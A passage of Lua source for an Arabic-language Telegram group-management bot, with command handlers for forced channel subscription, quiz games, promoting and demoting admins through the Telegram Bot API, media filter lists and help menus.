end
return false  
end
if text == "تعطيل الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id..'add:ch:id')
redis:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "• تم تعطيل الاشتراك الاجباري ") 
return false  
end
if text == "الاشتراك الاجباري" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
if redis:get(bot_id..'add:ch:username') then
local addchusername = redis:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "• تم تفعيل الاشتراك الاجباري \n على القناة ⇠ ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, "• لا يوجد قناة في الاشتراك الاجباري ") 
end
return false  
end
if text == "اعادة التشغيل" or text == "اعادة تشغيل" or text == "restart" then
dofile("Tshakex.lua")  
dofile("Info_Sudo.lua") 
send(msg.chat_id_, msg.id_, "تم اعادة تشغيل بوت و تحسينه")
end
if text == "اضف سوال كت تويت" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:set(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل السؤال الان ")
end
if text == "حذف سوال كت تويت" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."Tshakex:gamebot:List:Manager")
return send(msg.chat_id_, msg.id_,"تم حذف الاسئله")
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nتم حفظ السؤال بنجاح')
redis:set(bot_id.."Tshakex:gamebot:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
redis:sadd(bot_id.."Tshakex:gamebot:List:Manager", text)
return false end
end
if text == 'كت تويت' then
if redis:get(bot_id..'Tshakex:Lock:Game:Group'..msg.chat_id_) then
local list = redis:smembers(bot_id.."Tshakex:gamebot:List:Manager")
if #list ~= 0 then
local quschen = list[math.random(#list)]
send(msg.chat_id_, msg.id_,quschen)
end
end
end

if text == "اضف سوال مقالات" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل السؤال الان ")
end
if text == "حذف سوال مقالات" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."makal:bots")
return send(msg.chat_id_, msg.id_,"تم حذف الاسئله")
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nتم حفظ السؤال بنجاح')
redis:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
redis:sadd(bot_id.."makal:bots", text)
return false end
end
if text == 'السورس' or text == 'سورس' then
Text = [[

🌐┇ Welcome to Source
🚩┇[ Tm   -  ”X”](t.me/TshakeX)
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
🦁┇[Tshake'X' TEAM](t.me/TshakeX)

📂┇[Source Files](t.me/TshakeX_files)

💠┇[Make BoT](t.me/TshakeMakeBOT)

📥┇[YouTube downloader](t.me/bhhBOT)

🔰┇[CHANNEL Tumblr](t.me/DDDDID)
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
[📮┇ConnectDeV](t.me/tshakebbot)

]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'مقالات' then
local list = redis:smembers(bot_id.."makal:bots")
if #list ~= 0 then
quschen = list[math.random(#list)]
quschen1 = string.gsub(quschen,"-"," ")
quschen1 = string.gsub(quschen1,"*"," ")
quschen1 = string.gsub(quschen1,"•"," ")
quschen1 = string.gsub(quschen1,"_"," ")
quschen1 = string.gsub(quschen1,","," ")
quschen1 = string.gsub(quschen1,"/"," ")
print(quschen1)
send(msg.chat_id_, msg.id_,'['..quschen..']')
redis:set(bot_id.."makal:bots:qus"..msg.chat_id_,quschen1)
redis:setex(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 60, true) 
end
end
if text == ""..(redis:get(bot_id.."makal:bots:qus"..msg.chat_id_) or '').."" then
local timemkall = redis:ttl(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
local timemkal = (60 - timemkall)
if tonumber(timemkal) == 1 then
send(msg.chat_id_, msg.id_,'  استمر ي وحش ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 2 then
send(msg.chat_id_, msg.id_,'  اكيد محد ينافسك ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 3 then
send(msg.chat_id_, msg.id_,'  اتوقع محد ينافسك ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 4 then
send(msg.chat_id_, msg.id_,'  مركب تيربو !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 5 then
send(msg.chat_id_, msg.id_, '  صح عليك !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 6 then
send(msg.chat_id_, msg.id_,'   صحيح !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 7 then
send(msg.chat_id_, msg.id_,'   شد حيلك ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 8 then
send(msg.chat_id_, msg.id_, '  عندك اسرع ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 9 then
send(msg.chat_id_, msg.id_,'   يجي ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 10 then
send(msg.chat_id_, msg.id_,'   كفو ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 11 then
send(msg.chat_id_, msg.id_,'   ماش !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 12 then
send(msg.chat_id_, msg.id_,'   مستوى مستوى !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 13 then
send(msg.chat_id_, msg.id_,'   تدرب ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 14 then
send(msg.chat_id_, msg.id_,'   مدري وش اقول ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 15 then
send(msg.chat_id_, msg.id_,'   بطه ! \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 16 then
send(msg.chat_id_, msg.id_,'   ي بطوط !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 17 then
send(msg.chat_id_, msg.id_,'   مافي اسرع  !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 18 then
send(msg.chat_id_, msg.id_,'   بكير  !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 19 then
send(msg.chat_id_, msg.id_,'   وش هذا !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 20 then
send(msg.chat_id_, msg.id_,'   الله يعينك !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 21 then
send(msg.chat_id_, msg.id_,'   كيبوردك يعلق ههههه  !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 22 then
send(msg.chat_id_, msg.id_,'   يبي لك تدريب  !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 23 then
send(msg.chat_id_, msg.id_,'   انت اخر واحد رسلت وش ذا !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 24 then
send(msg.chat_id_, msg.id_,'   ههههه بطى !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 25 then
send(msg.chat_id_, msg.id_,'   ابك وش العلم !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 26 then
send(msg.chat_id_, msg.id_,'  اخر مرا تلعب !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 27 then
send(msg.chat_id_, msg.id_,'   ي بطي !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 28 then
send(msg.chat_id_, msg.id_,'   ليه انت بطى يخوي !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 29 then
send(msg.chat_id_, msg.id_,'   تدبر زين بس  !  \n عدد الثواني {'..timemkal..'}')
elseif tonumber(timemkal) == 30 then
send(msg.chat_id_, msg.id_,'  مستوى بس !  \n عدد الثواني {'..timemkal..'}')
end
redis:del(bot_id.."makal:bots:qus"..msg.sender_user_id_..":"..msg.chat_id_)
redis:del(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if text and text:match("تغير (.*)") and msg.reply_to_message_id_ ~= 0 and Constructor(msg)then
local namess = text:match("تغير (.*)")
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'hlil3')..') '
status  = '\n• \n تم تغير لقب '..namess..''
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..namess)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^(تغير) @(.*) (.*)$") then
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
local TextEnd = {string.match(text, "^(تغير) @(.*) (.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n• العضو ⇠ ['..result.title_..'](t.me/'..(username or 'hlil3')..')'
status  = ' \n تم تغير لقب '..TextEnd[3]..' '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&custom_title="..TextEnd[3])
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[2]}, start_function, nil)
return false
end
if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 then
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'hlil3')..') '
status  = '\n• \n تم رفعه مشرف بالقروب '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف @(.*)$") then
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
local username = text:match("^رفع مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n• العضو ⇠ ['..result.title_..'](t.me/'..(username or 'hlil3')..')'
status  = '\n تم رفعه مشرف بالقروب '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 then
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'hlil3')..') '
status  = '\n• تم تنزيله مشرف'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف @(.*)$") then
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
local username = text:match("^تنزيل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n• العضو ⇠ ['..result.title_..'](t.me/'..(username or 'hlil3')..')'
status  = '\n تم تنزيله مشرف من القروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع مالك") and msg.reply_to_message_id_ ~= 0 then
if not PresidentGroup(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص بالمنشئ الاساسي فقط')
return false
end
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'hlil3')..') '
status  = '\n• \n تم رفع العضو مالك القروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مالك @(.*)$") then
if not PresidentGroup(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص بالمنشئ الاساسي فقط')
return false
end
local username = text:match("^رفع مالك @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n• العضو ⇠ ['..result.title_..'](t.me/'..(username or 'hlil3')..')'
status  = '\n تم رفع العضو مالك'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مالك") and msg.reply_to_message_id_ ~= 0 then
if not PresidentGroup(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص بالمنشئ الاساسي فقط')
return false
end
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'hlil3')..') '
status  = '\n• \n تم تنزيله تنزيل مالك من القروب بكل الصلاحيات'
send1(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك @(.*)$") then
if not PresidentGroup(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص بالمنشئ الاساسي فقط')
return false
end
local username = text:match("^تنزيل مالك @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n• العضو ⇠ ['..result.title_..'](t.me/'..(username or 'hlil3')..')'
status  = '\n تم رفع عضو مالك'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 then
if not Owner(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ')
return false
end     
function cb(a,b,c) 
textt = '•تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
redis:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
redis:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
redis:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 then
if not Owner(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ')
return false
end     
function cb(a,b,c) 
textt = '• تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
redis:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
redis:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
redis:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'مسح قائمة منع المتحركات' then
if not Owner(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ')
return false
end     
redis:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'• تم مسح قائمة منع المتحركات')  
end
if text == 'مسح قائمة منع الصور' then
if not Owner(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ')
return false
end     
redis:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'• تم مسح قائمة منع الصور')  
end
if text == 'مسح قائمة منع الملصقات' then
if not Owner(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ')
return false
end     
redis:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'• تم مسح قائمة منع الملصقات')  
end

if text == 'تغير الايدي' then
if not Admin(msg) then 
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n الامر يخص - الادمن - مدير فقط')
return false
end 
local List = {[[
𖡋 𝐔𝐒𝐄 ⌯ #username 𖥲 .
𖡋 𝐌𝐒𝐆 ⌯ #msgs 𖥲 .
𖡋 𝐒𝐓𝐀 ⌯ #stast 𖥲 .
𖡋 𝐈𝐃 ⌯ #id 𖥲 .
]],
[[
-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 ¦ #username .
-›   𝙸𝙳 ¦ #msgs .
-›   𝚂𝚃𝙰𝚂𝚃 ¦ #stast .
-›   𝙼𝚂𝙶𝚂 ¦ #id .
]],
[[
𝐔𝐬𝐞𝐫  : #username  .
𝐌𝐬𝐠𝐞 :  #msgs  .
𝐒𝐭𝐚 :#stast  .
𝐈𝐝 : #id  .
]],
[[
𝗨𝗦𝗘𝗥??𝗔𝗠??: #username  .
𝗠𝗦𝗚: #msgs  .
𝗦𝗧𝗔𝗧 :#stast  .
𝗜𝗗: #id  .
]],
[[
𝗨𝗦𝗘𝗥 : #username  .
𝗠𝗦𝗚 : #msgs  .
𝗦𝗧𝗔𝗧 : #stast  .
𝗜𝗗 : #id  .
]],
[[
𝚄𝚜𝚎𝚛 ✯ #username  
𝚂𝚝𝚊  ✯ #stast  
𝙸𝚍   ✯ #id  
𝙼𝚜𝚐𝚎 ✯ #msgs
]]}
local Text_Rand = List[math.random(#List)]
redis:set(bot_id.."Tshakex:Set:Id:Group"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'܁تم تغير الايدي قم بالتجربه ')
end
if text == 'تعين الايدي عام' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
܁يمكنك اضافة ܊
▹ `#username` - ܁ اسم المستخدم
▹ `#msgs` - ܁ عدد رسائل المستخدم
▹ `#photos` - ܁ عدد صور المستخدم
▹ `#id` - ܁ ايدي المستخدم
▹ `#stast` - ܁ رتبة المستخدم
▹ `#edit` - ܁ عدد تعديلات 
▹ `#game` - ܁ نقاط
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end
if redis:get(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"܁تم الغاء تعين الايدي") 
redis:del(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
redis:set(bot_id.."KLISH:ID:bot",CHENGER_ID)
send(msg.chat_id_, msg.id_,'܁تم تعين الايدي بنجاح')    
end
if text == 'حذف الايدي عام' or text == 'مسح الايدي عام' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."KLISH:ID:bot")
send(msg.chat_id_, msg.id_, '܁ تم ازالة كليشة الايدي ')
return false  
end 
if text == 'الاوامر' or text == 'اوامر' or text == 'الأوامر' then
if Admin(msg) then
local Text =[[
*• اوامر المجموعه*
 ━━━━━━━━
• م1 => اوامر الادمنيه
• م2 => اوامر التفعيل - التعطيل - الرفع
• م3 => اوامر المسح
• م4 => اوامر مطور 
• م C => اوامر المطور الاساسي 
 ━━━━━━━━
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=msg.sender_user_id_.."/help1"},{text = '⓶', callback_data=msg.sender_user_id_.."/help2"},{text = '⓷', callback_data=msg.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data="/help4"},
},
{
{text = 'اوامر التعطيل', callback_data=msg.sender_user_id_.."/homeaddrem"},{text = 'اوامر القفل', callback_data=msg.sender_user_id_.."/homelocks"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) == 0 or text == 'ID' and tonumber(msg.reply_to_message_id_) == 0 or text == 'Id' and tonumber(msg.reply_to_message_id_) == 0 or text == 'id' and tonumber(msg.reply_to_message_id_) == 0 and not redis:get(bot_id..'Tshakex:Lock:Id:Photo'..msg.chat_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,yazon,success) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'لا يوجد'
end
local Id = msg.sender_user_id_
local NumMsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Num_Games = redis:get(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_) or 0
local Add_Mem = redis:get(bot_id.."Tshakex:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Total_Photp = (yazon.total_count_ or 0)
local Texting = {
